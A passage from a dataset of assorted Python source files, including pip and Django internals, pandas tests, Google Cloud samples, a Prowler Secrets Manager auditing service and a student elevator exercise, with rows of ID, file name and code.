            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY104	JY104-__init__.py	"from typing import List, Optional

from .base import BaseDistribution, BaseEnvironment, FilesystemWheel, MemoryWheel, Wheel

__all__ = [
    ""BaseDistribution"",
    ""BaseEnvironment"",
    ""FilesystemWheel"",
    ""MemoryWheel"",
    ""Wheel"",
    ""get_default_environment"",
    ""get_environment"",
    ""get_wheel_distribution"",
]


def get_default_environment() -> BaseEnvironment:
    """"""Get the default representation for the current environment.

    This returns an Environment instance from the chosen backend. The default
    Environment instance should be built from ``sys.path`` and may use caching
    to share instance state accorss calls.
    """"""
    from .pkg_resources import Environment

    return Environment.default()


def get_environment(paths: Optional[List[str]]) -> BaseEnvironment:
    """"""Get a representation of the environment specified by ``paths``.

    This returns an Environment instance from the chosen backend based on the
    given import paths. The backend must build a fresh instance representing
    the state of installed distributions when this function is called.
    """"""
    from .pkg_resources import Environment

    return Environment.from_paths(paths)


def get_directory_distribution(directory: str) -> BaseDistribution:
    """"""Get the distribution metadata representation in the specified directory.

    This returns a Distribution instance from the chosen backend based on
    the given on-disk ``.dist-info`` directory.
    """"""
    from .pkg_resources import Distribution

    return Distribution.from_directory(directory)


def get_wheel_distribution(wheel: Wheel, canonical_name: str) -> BaseDistribution:
    """"""Get the representation of the specified wheel's distribution metadata.

    This returns a Distribution instance from the chosen backend based on
    the given wheel's ``.dist-info`` directory.

    :param canonical_name: Normalized project name of the given wheel.
    """"""
    from .pkg_resources import Distribution

    return Distribution.from_wheel(wheel, canonical_name)"
JD344	JD344-secretsmanager_service.py	"import threading

from pydantic import BaseModel

from prowler.lib.logger import logger
from prowler.providers.aws.aws_provider import generate_regional_clients


################## SecretsManager
class SecretsManager:
    def __init__(self, audit_info):
        self.service = ""secretsmanager""
        self.session = audit_info.audit_session
        self.audited_account = audit_info.audited_account
        self.regional_clients = generate_regional_clients(self.service, audit_info)
        self.secrets = {}
        self.__threading_call__(self.__list_secrets__)

    def __get_session__(self):
        return self.session

    def __threading_call__(self, call):
        threads = []
        for regional_client in self.regional_clients.values():
            threads.append(threading.Thread(target=call, args=(regional_client,)))
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def __list_secrets__(self, regional_client):
        logger.info(""SecretsManager - Listing Secrets..."")
        try:
            list_secrets_paginator = regional_client.get_paginator(""list_secrets"")
            for page in list_secrets_paginator.paginate():
                for secret in page[""SecretList""]:
                    self.secrets[secret[""Name""]] = Secret(
                        arn=secret[""ARN""],
                        name=secret[""Name""],
                        region=regional_client.region,
                    )
                    if ""RotationEnabled"" in secret:
                        self.secrets[secret[""Name""]].rotation_enabled = secret[
                            ""RotationEnabled""
                        ]

        except Exception as error:
            logger.error(
                f""{regional_client.region} --""
                f"" {error.__class__.__name__}[{error.__traceback__.tb_lineno}]:""
                f"" {error}""
            )


class Secret(BaseModel):
    arn: str
    name: str
    region: str
    rotation_enabled: bool = False"
JD516	JD516-test_join.py	"import numpy as np
import pytest

from pandas._libs.tslibs import IncompatibleFrequency

from pandas import (
    Index,
    PeriodIndex,
    period_range,
)
import pandas._testing as tm


class TestJoin:
    def test_join_outer_indexer(self):
        pi = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")

        result = pi._outer_indexer(pi)
        tm.assert_extension_array_equal(result[0], pi._values)
        tm.assert_numpy_array_equal(result[1], np.arange(len(pi), dtype=np.intp))
        tm.assert_numpy_array_equal(result[2], np.arange(len(pi), dtype=np.intp))

    def test_joins(self, join_type):
        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")

        joined = index.join(index[:-5], how=join_type)

        assert isinstance(joined, PeriodIndex)
        assert joined.freq == index.freq

    def test_join_self(self, join_type):
        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")

        res = index.join(index, how=join_type)
        assert index is res

    def test_join_does_not_recur(self):
        df = tm.makeCustomDataframe(
            3,
            2,
            data_gen_f=lambda *args: np.random.randint(2),
            c_idx_type=""p"",
            r_idx_type=""dt"",
        )
        ser = df.iloc[:2, 0]

        res = ser.index.join(df.columns, how=""outer"")
        expected = Index(
            [ser.index[0], ser.index[1], df.columns[0], df.columns[1]], object
        )
        tm.assert_index_equal(res, expected)

    def test_join_mismatched_freq_raises(self):
        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")
        index3 = period_range(""1/1/2000"", ""1/20/2000"", freq=""2D"")
        msg = r"".*Input has different freq=2D from Period\(freq=D\)""
        with pytest.raises(IncompatibleFrequency, match=msg):
            index.join(index3)"
JY521	JY521-Tehtävä2.py	"# Jatka edellisen tehtävän ohjelmaa siten, että teet Talo-luokan. Talon alustajaparametreina annetaan alimman
# ja ylimmän kerroksen numero sekä hissien lukumäärä. Talon luonnin yhteydessä talo luo tarvittavan määrän hissejä.
# Hissien lista tallennetaan talon ominaisuutena.
# Kirjoita taloon metodi aja_hissiä, joka saa parametreinaan hissin numeron ja kohdekerroksen.
# Kirjoita pääohjelmaan lauseet talon luomiseksi ja talon hisseillä ajelemiseksi.

class Elevator:
    def __init__(self, bottom_floor, top_floor):
        self.bottom_floor = bottom_floor
        self.top_floor = top_floor
        self.current_floor = bottom_floor

    def floor_up(self):
        self.current_floor += 1
        print(f'the elevator goes up to the floor {self.current_floor}')

    def floor_down(self):
        self.current_floor -= 1
        print(f'the elevator goes down to the floor {self.current_floor}')

    def go_to_floor(self, floor):
        if floor >= self.bottom_floor and floor <= self.top_floor:
            while self.current_floor != floor:
                if floor > self.current_floor:
                    self.floor_up()
                else:
                    self.floor_down()
            print(""You have reached floor "", floor)
        else:
            print(""Invalid floor number"")


class Building:
    def __init__(self, elevators, bottom_num, top_num):
        self.bottom_num = bottom_num
        self.top_num = top_num

        self.elevators = [Elevator(bottom_num, top_num) for i in range(elevators)]

    def run_elevator(self, elevator_number, destination):

        self.elevators[elevator_number].go_to_floor(destination)


new_Building = Building(2, 0, 10)

#elevator run floor values

new_Building.run_elevator(0, 5)
new_Building.run_elevator(1, 7)"
JY454	JY454-test_head_tail.py	"import numpy as np

from pandas import DataFrame
import pandas._testing as tm


def test_head_tail_generic(index, frame_or_series):
    # GH#5370

    ndim = 2 if frame_or_series is DataFrame else 1
    shape = (len(index),) * ndim
    vals = np.random.randn(*shape)
    obj = frame_or_series(vals, index=index)

    tm.assert_equal(obj.head(), obj.iloc[:5])
    tm.assert_equal(obj.tail(), obj.iloc[-5:])

    # 0-len
    tm.assert_equal(obj.head(0), obj.iloc[0:0])
    tm.assert_equal(obj.tail(0), obj.iloc[0:0])

    # bounded
    tm.assert_equal(obj.head(len(obj) + 1), obj)
    tm.assert_equal(obj.tail(len(obj) + 1), obj)

    # neg index
    tm.assert_equal(obj.head(-3), obj.head(len(index) - 3))
    tm.assert_equal(obj.tail(-3), obj.tail(len(index) - 3))


def test_head_tail(float_frame):
    tm.assert_frame_equal(float_frame.head(), float_frame[:5])
    tm.assert_frame_equal(float_frame.tail(), float_frame[-5:])

    tm.assert_frame_equal(float_frame.head(0), float_frame[0:0])
    tm.assert_frame_equal(float_frame.tail(0), float_frame[0:0])

    tm.assert_frame_equal(float_frame.head(-1), float_frame[:-1])
    tm.assert_frame_equal(float_frame.tail(-1), float_frame[1:])
    tm.assert_frame_equal(float_frame.head(1), float_frame[:1])
    tm.assert_frame_equal(float_frame.tail(1), float_frame[-1:])
    # with a float index
    df = float_frame.copy()
    df.index = np.arange(len(float_frame)) + 0.1
    tm.assert_frame_equal(df.head(), df.iloc[:5])
    tm.assert_frame_equal(df.tail(), df.iloc[-5:])
    tm.assert_frame_equal(df.head(0), df[0:0])
    tm.assert_frame_equal(df.tail(0), df[0:0])
    tm.assert_frame_equal(df.head(-1), df.iloc[:-1])
    tm.assert_frame_equal(df.tail(-1), df.iloc[1:])


def test_head_tail_empty():
    # test empty dataframe
    empty_df = DataFrame()
    tm.assert_frame_equal(empty_df.tail(), empty_df)
    tm.assert_frame_equal(empty_df.head(), empty_df)"
JY448	JY448-debug.py	"""""""Debugging support.""""""
from __future__ import absolute_import, unicode_literals

import logging

from vine.utils import wraps

from kombu.five import items, python_2_unicode_compatible
from kombu.log import get_logger

__all__ = ('setup_logging', 'Logwrapped')


def setup_logging(loglevel=logging.DEBUG, loggers=None):
    """"""Setup logging to stdout.""""""
    loggers = ['kombu.connection', 'kombu.channel'] if not loggers else loggers
    for logger_name in loggers:
        logger = get_logger(logger_name)
        logger.addHandler(logging.StreamHandler())
        logger.setLevel(loglevel)


@python_2_unicode_compatible
class Logwrapped(object):
    """"""Wrap all object methods, to log on call.""""""

    __ignore = ('__enter__', '__exit__')

    def __init__(self, instance, logger=None, ident=None):
        self.instance = instance
        self.logger = get_logger(logger)
        self.ident = ident

    def __getattr__(self, key):
        meth = getattr(self.instance, key)

        if not callable(meth) or key in self.__ignore:
            return meth

        @wraps(meth)
        def __wrapped(*args, **kwargs):
            info = ''
            if self.ident:
                info += self.ident.format(self.instance)
            info += '{0.__name__}('.format(meth)
            if args:
                info += ', '.join(map(repr, args))
            if kwargs:
                if args:
                    info += ', '
                info += ', '.join('{k}={v!r}'.format(k=key, v=value)
                                  for key, value in items(kwargs))
            info += ')'
            self.logger.debug(info)
            return meth(*args, **kwargs)

        return __wrapped

    def __repr__(self):
        return repr(self.instance)

    def __dir__(self):
        return dir(self.instance)"
JD362	JD362-sample_storage_test_system.py	"# Copyright 2018 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the 'License');
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an 'AS IS' BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START functions_storage_system_test]
from datetime import datetime
from os import getenv, path
import subprocess
import time
import uuid

from google.cloud import storage
import pytest

PROJECT = getenv('GCP_PROJECT')
BUCKET = getenv('BUCKET')

assert PROJECT is not None
assert BUCKET is not None


@pytest.fixture(scope='module')
def storage_client():
    yield storage.Client()


@pytest.fixture(scope='module')
def bucket_object(storage_client):
    bucket_object = storage_client.get_bucket(BUCKET)
    yield bucket_object


@pytest.fixture(scope='module')
def uploaded_file(bucket_object):
    name = 'test-{}.txt'.format(str(uuid.uuid4()))
    blob = bucket_object.blob(name)

    test_dir = path.dirname(path.abspath(__file__))
    blob.upload_from_filename(path.join(test_dir, 'test.txt'))
    yield name
    blob.delete()


def test_hello_gcs(uploaded_file):
    start_time = datetime.utcnow().isoformat()
    time.sleep(10)  # Wait for logs to become consistent

    log_process = subprocess.Popen([
        'gcloud',
        'alpha',
        'functions',
        'logs',
        'read',
        'hello_gcs_generic',
        '--start-time',
        start_time
    ], stdout=subprocess.PIPE)
    logs = str(log_process.communicate()[0])
    assert uploaded_file in logs
# [END functions_storage_system_test]"
JD462	JD462-urls.py	"""""""core URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/3.2/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
""""""
from django.conf import settings
from django.contrib import admin
from django.urls import include, path

from . import views

# from django.views import debug


# Admin site Branding
admin.site.site_header = ""CoreProject administration""
admin.site.site_title = ""CoreProject site admin""

# Error handlers
handler400 = views.four_zero_zero_view
handler403 = views.four_zero_three_view
handler404 = views.four_zero_four_view
handler500 = views.five_zero_zero_view

# Write your urls here

urlpatterns = [
    # Default django welcome page
    # path("""", debug.default_urlconf),
    path("""", views.home_view, name=""home_view""),
    #   Admin Site
    # ================
    path(""admin/"", admin.site.urls),
    #   HTTP
    # =========
    path(""user/"", include(""apps.user.urls"")),
    #   OpenGraph
    # =============
    path(""opengraph/"", include(""apps.opengraph.urls"")),
    #   Api
    # ========
    path(""api/"", include(""apps.api.urls"")),
]

if settings.DEBUG:
    urlpatterns += [
        path(""__debug__/"", include(""debug_toolbar.urls"")),
        path(""__reload__/"", include(""django_browser_reload.urls"")),
        #   Errors
        # ===========
        path(""400/"", handler400),
        path(""403/"", handler403),
        path(""404/"", handler404),
        path(""500/"", handler500),
    ]"
JY125	JY125-translation.py	"from django.conf import settings
from django.utils.translation import get_supported_language_variant
from django.utils.translation.trans_real import language_code_re

from . import Error, Tags, register

E001 = Error(
    ""You have provided an invalid value for the LANGUAGE_CODE setting: {!r}."",
    id=""translation.E001"",
)

E002 = Error(
    ""You have provided an invalid language code in the LANGUAGES setting: {!r}."",
    id=""translation.E002"",
)

E003 = Error(
    ""You have provided an invalid language code in the LANGUAGES_BIDI setting: {!r}."",
    id=""translation.E003"",
)

E004 = Error(
    ""You have provided a value for the LANGUAGE_CODE setting that is not in ""
    ""the LANGUAGES setting."",
    id=""translation.E004"",
)


@register(Tags.translation)
def check_setting_language_code(app_configs, **kwargs):
    """"""Error if LANGUAGE_CODE setting is invalid.""""""
    tag = settings.LANGUAGE_CODE
    if not isinstance(tag, str) or not language_code_re.match(tag):
        return [Error(E001.msg.format(tag), id=E001.id)]
    return []


@register(Tags.translation)
def check_setting_languages(app_configs, **kwargs):
    """"""Error if LANGUAGES setting is invalid.""""""
    return [
        Error(E002.msg.format(tag), id=E002.id)
        for tag, _ in settings.LANGUAGES
        if not isinstance(tag, str) or not language_code_re.match(tag)
    ]


@register(Tags.translation)
def check_setting_languages_bidi(app_configs, **kwargs):
    """"""Error if LANGUAGES_BIDI setting is invalid.""""""
    return [
        Error(E003.msg.format(tag), id=E003.id)
        for tag in settings.LANGUAGES_BIDI
        if not isinstance(tag, str) or not language_code_re.match(tag)
    ]


@register(Tags.translation)
def check_language_settings_consistent(app_configs, **kwargs):
    """"""Error if language settings are not consistent with each other.""""""
    try:
        get_supported_language_variant(settings.LANGUAGE_CODE)
    except LookupError:
        return [E004]
    else:
        return []"
JD42	JD42-_windows.py	"import sys
from dataclasses import dataclass


@dataclass
class WindowsConsoleFeatures:
    """"""Windows features available.""""""

    vt: bool = False
    """"""The console supports VT codes.""""""
    truecolor: bool = False
    """"""The console supports truecolor.""""""


try:
    import ctypes
    from ctypes import LibraryLoader

    if sys.platform == ""win32"":
        windll = LibraryLoader(ctypes.WinDLL)
    else:
        windll = None
        raise ImportError(""Not windows"")

    from pip._vendor.rich._win32_console import (
        ENABLE_VIRTUAL_TERMINAL_PROCESSING,
        GetConsoleMode,
        GetStdHandle,
        LegacyWindowsError,
    )

except (AttributeError, ImportError, ValueError):

    # Fallback if we can't load the Windows DLL
    def get_windows_console_features() -> WindowsConsoleFeatures:
        features = WindowsConsoleFeatures()
        return features

else:

    def get_windows_console_features() -> WindowsConsoleFeatures:
        """"""Get windows console features.

        Returns:
            WindowsConsoleFeatures: An instance of WindowsConsoleFeatures.
        """"""
        handle = GetStdHandle()
        try:
            console_mode = GetConsoleMode(handle)
            success = True
        except LegacyWindowsError:
            console_mode = 0
            success = False
        vt = bool(success and console_mode & ENABLE_VIRTUAL_TERMINAL_PROCESSING)
        truecolor = False
        if vt:
            win_version = sys.getwindowsversion()
            truecolor = win_version.major > 10 or (
                win_version.major == 10 and win_version.build >= 15063
            )
        features = WindowsConsoleFeatures(vt=vt, truecolor=truecolor)
        return features


if __name__ == ""__main__"":
    import platform

    features = get_windows_console_features()
    from pip._vendor.rich import print

    print(f'platform=""{platform.system()}""')
    print(repr(features))"
JD505	JD505-test_s3.py	"import pytest

from pathy import Pathy, get_client, use_fs

from . import s3_installed, s3_testable
from .conftest import ENV_ID

S3_ADAPTER = [""s3""]


@pytest.mark.parametrize(""adapter"", S3_ADAPTER)
@pytest.mark.skipif(not s3_testable, reason=""requires s3"")
def test_s3_scandir_scandir_continuation_token(
    with_adapter: str, bucket: str, other_bucket: str
) -> None:
    from pathy.s3 import ScanDirS3

    root = Pathy(f""{with_adapter}://{bucket}/{ENV_ID}/s3_scandir_pagination/"")
    for i in range(8):
        (root / f""file{i}.blob"").touch()
    client = root.client(root)
    scandir = ScanDirS3(client=client, path=root, prefix=root.prefix, page_size=4)
    blobs = [s.name for s in scandir]
    assert len(blobs) == 8


@pytest.mark.parametrize(""adapter"", S3_ADAPTER)
@pytest.mark.skipif(not s3_testable, reason=""requires s3"")
def test_s3_scandir_invalid_bucket_name(with_adapter: str) -> None:
    from pathy.s3 import ScanDirS3

    root = Pathy(f""{with_adapter}://invalid_h3gE_ds5daEf_Sdf15487t2n4/bar"")
    client = root.client(root)
    scandir = ScanDirS3(client=client, path=root)
    assert len(list(scandir)) == 0


@pytest.mark.parametrize(""adapter"", S3_ADAPTER)
@pytest.mark.skipif(not s3_testable, reason=""requires s3"")
def test_s3_bucket_client_list_blobs(with_adapter: str, bucket: str) -> None:
    """"""Test corner-case in S3 client that isn't easily reachable from Pathy""""""
    from pathy.s3 import BucketClientS3

    client: BucketClientS3 = get_client(""s3"")
    root = Pathy(""s3://invalid_h3gE_ds5daEf_Sdf15487t2n4"")
    assert len(list(client.list_blobs(root))) == 0


@pytest.mark.skipif(s3_installed, reason=""requires s3 deps to NOT be installed"")
def test_s3_import_error_missing_deps() -> None:
    use_fs(False)
    with pytest.raises(ImportError):
        get_client(""s3"")"
JY288	JY288-__main__.py	"#!/usr/bin/env python
# PYTHON_ARGCOMPLETE_OK
#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
""""""Main executable module.""""""
from __future__ import annotations

import os

import argcomplete

# The configuration module initializes and validates the conf object as a side effect the first
# time it is imported. If it is not imported before importing the settings module, the conf
# object will then be initted/validated as a side effect of it being imported in settings,
# however this can cause issues since those modules are very tightly coupled and can
# very easily cause import cycles in the conf init/validate code (since downstream code from
# those functions likely import settings).
# Therefore importing configuration early (as the first airflow import) avoids
# any possible import cycles with settings downstream.
from airflow import configuration
from airflow.cli import cli_parser


def main():
    """"""Main executable function.""""""
    conf = configuration.conf
    if conf.get(""core"", ""security"") == ""kerberos"":
        os.environ[""KRB5CCNAME""] = conf.get(""kerberos"", ""ccache"")
        os.environ[""KRB5_KTNAME""] = conf.get(""kerberos"", ""keytab"")
    parser = cli_parser.get_parser()
    argcomplete.autocomplete(parser)
    args = parser.parse_args()
    args.func(args)


if __name__ == ""__main__"":
    main()"
JD455	JD455-batch_predict.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


# [START automl_batch_predict_beta]
from google.cloud import automl_v1beta1 as automl


def batch_predict(
    project_id=""YOUR_PROJECT_ID"",
    model_id=""YOUR_MODEL_ID"",
    input_uri=""gs://YOUR_BUCKET_ID/path/to/your/input/csv_or_jsonl"",
    output_uri=""gs://YOUR_BUCKET_ID/path/to/save/results/"",
):
    """"""Batch predict""""""
    prediction_client = automl.PredictionServiceClient()

    # Get the full path of the model.
    model_full_id = automl.AutoMlClient.model_path(
        project_id, ""us-central1"", model_id
    )

    gcs_source = automl.GcsSource(input_uris=[input_uri])

    input_config = automl.BatchPredictInputConfig(gcs_source=gcs_source)
    gcs_destination = automl.GcsDestination(output_uri_prefix=output_uri)
    output_config = automl.BatchPredictOutputConfig(
        gcs_destination=gcs_destination
    )
    params = {}

    request = automl.BatchPredictRequest(
        name=model_full_id,
        input_config=input_config,
        output_config=output_config,
        params=params
    )
    response = prediction_client.batch_predict(
        request=request
    )

    print(""Waiting for operation to complete..."")
    print(
        ""Batch Prediction results saved to Cloud Storage bucket. {}"".format(
            response.result()
        )
    )
# [END automl_batch_predict_beta]"
JY111	JY111-selection_prefs.py	"from typing import Optional

from pip._internal.models.format_control import FormatControl


class SelectionPreferences:
    """"""
    Encapsulates the candidate selection preferences for downloading
    and installing files.
    """"""

    __slots__ = [
        ""allow_yanked"",
        ""allow_all_prereleases"",
        ""format_control"",
        ""prefer_binary"",
        ""ignore_requires_python"",
    ]

    # Don't include an allow_yanked default value to make sure each call
    # site considers whether yanked releases are allowed. This also causes
    # that decision to be made explicit in the calling code, which helps
    # people when reading the code.
    def __init__(
        self,
        allow_yanked: bool,
        allow_all_prereleases: bool = False,
        format_control: Optional[FormatControl] = None,
        prefer_binary: bool = False,
        ignore_requires_python: Optional[bool] = None,
    ) -> None:
        """"""Create a SelectionPreferences object.

        :param allow_yanked: Whether files marked as yanked (in the sense
            of PEP 592) are permitted to be candidates for install.
        :param format_control: A FormatControl object or None. Used to control
            the selection of source packages / binary packages when consulting
            the index and links.
        :param prefer_binary: Whether to prefer an old, but valid, binary
            dist over a new source dist.
        :param ignore_requires_python: Whether to ignore incompatible
            ""Requires-Python"" values in links. Defaults to False.
        """"""
        if ignore_requires_python is None:
            ignore_requires_python = False

        self.allow_yanked = allow_yanked
        self.allow_all_prereleases = allow_all_prereleases
        self.format_control = format_control
        self.prefer_binary = prefer_binary
        self.ignore_requires_python = ignore_requires_python"
JD56	JD56-unreader.py	"# -*- coding: utf-8 -
#
# This file is part of gunicorn released under the MIT license.
# See the NOTICE for more information.

import io
import os

# Classes that can undo reading data from
# a given type of data source.


class Unreader(object):
    def __init__(self):
        self.buf = io.BytesIO()

    def chunk(self):
        raise NotImplementedError()

    def read(self, size=None):
        if size is not None and not isinstance(size, int):
            raise TypeError(""size parameter must be an int or long."")

        if size is not None:
            if size == 0:
                return b""""
            if size < 0:
                size = None

        self.buf.seek(0, os.SEEK_END)

        if size is None and self.buf.tell():
            ret = self.buf.getvalue()
            self.buf = io.BytesIO()
            return ret
        if size is None:
            d = self.chunk()
            return d

        while self.buf.tell() < size:
            chunk = self.chunk()
            if not chunk:
                ret = self.buf.getvalue()
                self.buf = io.BytesIO()
                return ret
            self.buf.write(chunk)
        data = self.buf.getvalue()
        self.buf = io.BytesIO()
        self.buf.write(data[size:])
        return data[:size]

    def unread(self, data):
        self.buf.seek(0, os.SEEK_END)
        self.buf.write(data)


class SocketUnreader(Unreader):
    def __init__(self, sock, max_chunk=8192):
        super().__init__()
        self.sock = sock
        self.mxchunk = max_chunk

    def chunk(self):
        return self.sock.recv(self.mxchunk)


class IterUnreader(Unreader):
    def __init__(self, iterable):
        super().__init__()
        self.iter = iter(iterable)

    def chunk(self):
        if not self.iter:
            return b""""
        try:
            return next(self.iter)
        except StopIteration:
            self.iter = None
            return b"""""
JY163	JY163-test_move_multiselection.py	"""""""Test cell multiselect move""""""


from .utils import EDITOR_PAGE


INITIAL_CELLS = ['1', '2', '3', '4', '5', '6']


def test_move_multiselection(prefill_notebook):
    notebook_frontend = prefill_notebook(INITIAL_CELLS)

    def assert_order(pre_message, expected_state):
        for i in range(len(expected_state)):
            assert expected_state[i] == notebook_frontend.get_cell_contents(
                i), f""{pre_message}: Verify that cell {i} has for content: {expected_state[i]} found: {notebook_frontend.get_cell_contents(i)}""

    # Select 3 first cells
    notebook_frontend.select_cell_range(0, 2)
    notebook_frontend.evaluate(
        ""Jupyter.notebook.move_selection_up();"",
        EDITOR_PAGE
    )
    # Should not move up at top
    assert_order('move up at top', ['1', '2', '3', '4', '5', '6'])

    # We do not need to reselect, move/up down should keep the selection.
    notebook_frontend.evaluate(
        ""Jupyter.notebook.move_selection_down();"",
        EDITOR_PAGE
    )
    notebook_frontend.evaluate(
        ""Jupyter.notebook.move_selection_down();"",
        EDITOR_PAGE
    )
    notebook_frontend.evaluate(
        ""Jupyter.notebook.move_selection_down();"",
        EDITOR_PAGE
    )

    # 3 times down should move the 3 selected cells to the bottom
    assert_order(""move down to bottom"", ['4', '5', '6', '1', '2', '3'])
    notebook_frontend.evaluate(
        ""Jupyter.notebook.move_selection_down();"",
        EDITOR_PAGE
    )

    # They can't go any futher
    assert_order(""move down to bottom"", ['4', '5', '6', '1', '2', '3'])

    notebook_frontend.evaluate(
        ""Jupyter.notebook.move_selection_up();"",
        EDITOR_PAGE
    )
    notebook_frontend.evaluate(
        ""Jupyter.notebook.move_selection_up();"",
        EDITOR_PAGE
    )
    notebook_frontend.evaluate(
        ""Jupyter.notebook.move_selection_up();"",
        EDITOR_PAGE
    )

    # Bring them back on top
    assert_order('move up at top', ['1', '2', '3', '4', '5', '6'])"
JY102	JY102-gb2312prober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .mbcharsetprober import MultiByteCharSetProber
from .codingstatemachine import CodingStateMachine
from .chardistribution import GB2312DistributionAnalysis
from .mbcssm import GB2312_SM_MODEL


class GB2312Prober(MultiByteCharSetProber):
    def __init__(self):
        super(GB2312Prober, self).__init__()
        self.coding_sm = CodingStateMachine(GB2312_SM_MODEL)
        self.distribution_analyzer = GB2312DistributionAnalysis()
        self.reset()

    @property
    def charset_name(self):
        return ""GB2312""

    @property
    def language(self):
        return ""Chinese"""
JY319	JY319-doxygen_scan.py	"import traceback

class Symbol(object):
    def __init__(self, anchor, type, cppname):
        self.anchor = anchor
        self.type = type
        self.cppname = cppname
        #if anchor == 'ga586ebfb0a7fb604b35a23d85391329be':
        #    print(repr(self))
        #    traceback.print_stack()

    def __repr__(self):
        return '%s:%s@%s' % (self.type, self.cppname, self.anchor)

def add_to_file(files_dict, file, anchor):
    anchors = files_dict.setdefault(file, [])
    anchors.append(anchor)


def scan_namespace_constants(ns, ns_name, files_dict):
    constants = ns.findall(""./member[@kind='enumvalue']"")
    for c in constants:
        c_name = c.find(""./name"").text
        name = ns_name + '::' + c_name
        file = c.find(""./anchorfile"").text
        anchor = c.find(""./anchor"").text
        #print('    CONST: {} => {}#{}'.format(name, file, anchor))
        add_to_file(files_dict, file, Symbol(anchor, ""const"", name))

def scan_namespace_functions(ns, ns_name, files_dict):
    functions = ns.findall(""./member[@kind='function']"")
    for f in functions:
        f_name = f.find(""./name"").text
        name = ns_name + '::' + f_name
        file = f.find(""./anchorfile"").text
        anchor = f.find(""./anchor"").text
        #print('    FN: {} => {}#{}'.format(name, file, anchor))
        add_to_file(files_dict, file, Symbol(anchor, ""fn"", name))

def scan_class_methods(c, c_name, files_dict):
    methods = c.findall(""./member[@kind='function']"")
    for m in methods:
        m_name = m.find(""./name"").text
        name = c_name + '::' + m_name
        file = m.find(""./anchorfile"").text
        anchor = m.find(""./anchor"").text
        #print('    Method: {} => {}#{}'.format(name, file, anchor))
        add_to_file(files_dict, file, Symbol(anchor, ""method"", name))"
JD233	JD233-test_append.py	"import pytest

from pandas import (
    CategoricalIndex,
    Index,
)
import pandas._testing as tm


class TestAppend:
    @pytest.fixture
    def ci(self):
        categories = list(""cab"")
        return CategoricalIndex(list(""aabbca""), categories=categories, ordered=False)

    def test_append(self, ci):
        # append cats with the same categories
        result = ci[:3].append(ci[3:])
        tm.assert_index_equal(result, ci, exact=True)

        foos = [ci[:1], ci[1:3], ci[3:]]
        result = foos[0].append(foos[1:])
        tm.assert_index_equal(result, ci, exact=True)

    def test_append_empty(self, ci):
        # empty
        result = ci.append([])
        tm.assert_index_equal(result, ci, exact=True)

    def test_append_mismatched_categories(self, ci):
        # appending with different categories or reordered is not ok
        msg = ""all inputs must be Index""
        with pytest.raises(TypeError, match=msg):
            ci.append(ci.values.set_categories(list(""abcd"")))
        with pytest.raises(TypeError, match=msg):
